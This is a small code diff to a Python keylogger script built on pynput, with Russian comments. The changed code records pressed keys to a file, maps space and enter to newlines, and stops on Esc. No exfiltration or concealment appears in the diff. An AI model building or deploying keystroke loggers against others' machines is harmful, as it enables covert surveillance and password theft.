@@ -1,5 +1,5 @@
 import pynput
-from pynput.keyboard import Listener, Key, Controller
+from pynput.keyboard import Listener, Key
 
 
 def press(key):
@@ -7,17 +7,16 @@ def press(key):
         # Убрать кавычки из записи
         t = (str(key).replace("'", ""))
         # Писать с новой строки при пробелах
-        if key == Key.space or key == Key.enter:
-            t = '\n'
+        match key:
+            case Key.space:
+                t = '\n'
+            case Key.enter:
+                t = '\n'
         # Если не нажата спец.клавиша, то вписывать буквы
         if t.find('Key') == -1:
-            if not Controller.shift_pressed:
-                t = t.upper()
-            else:
-                t = t.lower()
             file.write(t)
 
-
+# Прекратить работу кода
 def release(key):
     if key == Key.esc:
         return False
